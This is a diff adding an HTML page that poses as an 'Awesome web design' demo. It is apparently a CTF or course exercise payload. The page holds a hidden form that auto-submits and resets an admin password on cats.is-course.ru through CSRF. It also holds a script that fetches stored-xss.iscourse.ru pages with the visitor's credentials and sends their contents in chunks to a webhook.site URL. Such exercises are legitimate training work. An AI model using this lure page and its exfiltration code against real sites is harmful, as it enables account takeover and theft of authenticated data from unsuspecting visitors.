@@ -1,0 +1,85 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<title>Awesome web design</title>
+<style>
+  body { font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", sans-serif; padding: 40px; }
+  h1 { color: #2563eb; }
+</style>
+</head>
+<body>
+<h1>Check out this beautiful design</h1>
+<p>This page demonstrates a sleek, modern web design pattern.</p>
+
+<!-- ============================================================= -->
+<!-- Exploit for cats.is-course.ru                                  -->
+<!-- Cookie is HttpOnly (can't read via document.cookie) but is    -->
+<!-- SameSite=None, so the browser will automatically attach it   -->
+<!-- to a cross-site POST request. The /settings endpoint accepts  -->
+<!-- a POST to change the user's password with NO CSRF token.     -->
+<!-- So we auto-submit a form that changes admin's password to     -->
+<!-- a value we know.                                              -->
+<!-- ============================================================= -->
+<form id="pw" action="https://cats.is-course.ru/settings" method="POST">
+  <input type="hidden" name="password" value="HackedP@ssw0rd!2024">
+  <input type="hidden" name="confirm-password" value="HackedP@ssw0rd!2024">
+</form>
+
+<!-- ============================================================= -->
+<!-- Exploit for stored-xss.iscourse.ru and stored-xss-hard.iscourse.ru -->
+<!-- Cookie is NOT HttpOnly and SameSite=None, so we can fetch the   -->
+<!-- homepage with credentials included, then exfiltrate the HTML  -->
+<!-- (which contains the flag if logged in as admin) to webhook.site -->
+<!-- ============================================================= -->
+<script>
+(function () {
+  var wb = 'https://webhook.site/cb78a979-05f6-457d-8c79-73073d00b593';
+
+  // Beacon that this page was rendered by a real browser (separates real-bot from curl-bot)
+  try {
+    fetch(wb + '?stage=page-rendered&origin=' + encodeURIComponent(location.href))
+      .catch(function(){});
+  } catch (e) {}
+
+  // 1) cats: auto-submit the password-change form.
+  //    SameSite=None means the cats session cookie will be sent along.
+  //    Use a short delay so the beacon above fires first.
+  setTimeout(function () {
+    try {
+      document.getElementById('pw').submit();
+    } catch (e) {
+      try { fetch(wb + '?stage=cat-form-submit-error&err=' + encodeURIComponent(String(e))).catch(function(){}); } catch (_) {}
+    }
+  }, 500);
+
+  // 2) stored-xss variants: fetch the homepage with credentials, exfiltrate the HTML.
+  //    The flag is shown on the homepage when logged in as admin.
+  function exfil(site, label) {
+    try {
+      fetch(site, { credentials: 'include', cache: 'no-store' })
+        .then(function (r) { return r.text(); })
+        .then(function (t) {
+          // Send in chunks (URL length limit)
+          var chunkSize = 1500;
+          for (var i = 0; i < t.length; i += chunkSize) {
+            var chunk = t.substring(i, i + chunkSize);
+            var idx = Math.floor(i / chunkSize);
+            fetch(wb + '?site=' + label + '&part=' + idx + '&total=' + Math.ceil(t.length/chunkSize) + '&data=' + encodeURIComponent(chunk))
+              .catch(function(){});
+          }
+        })
+        .catch(function (e) {
+          fetch(wb + '?site=' + label + '&error=' + encodeURIComponent(String(e))).catch(function(){});
+        });
+    } catch (e) {
+      fetch(wb + '?site=' + label + '&syncerror=' + encodeURIComponent(String(e))).catch(function(){});
+    }
+  }
+
+  setTimeout(function () { exfil('https://stored-xss.iscourse.ru/',         'stored-xss');      }, 1500);
+  setTimeout(function () { exfil('https://stored-xss-hard.iscourse.ru/',   'stored-xss-hard'); }, 2000);
+})();
+</script>
+</body>
+</html>
